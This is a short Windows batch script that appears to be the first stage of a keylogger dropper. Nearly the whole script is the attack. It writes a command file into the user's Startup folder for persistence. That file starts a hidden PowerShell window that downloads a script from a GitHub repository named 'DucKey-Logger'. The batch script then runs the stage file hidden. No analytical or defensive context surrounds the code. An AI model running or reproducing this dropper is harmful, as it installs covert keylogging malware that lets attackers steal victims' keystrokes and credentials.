@echo off

REM Save the current directory
set "initialPath=%cd%"

REM Define the startup path
set "startup=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

REM Change to the startup directory
cd /d "%startup%"

REM Create the stage2.cmd file
(
echo powershell -c "Start-Process powershell.exe -WindowStyle Hidden -ArgumentList 'Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/PrettyBoyCosmo/DucKey-Logger/main/p.ps1\" -OutFile \"p.ps1\"'"
) > wget.cmd

timeout /t 5 /nobreak > nul

REM Run the stage2.cmd script
powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget.cmd\"' -WindowStyle Hidden"

REM Go back to the initial directory
cd /d "%initialPath%"

@REM del initial.cmd
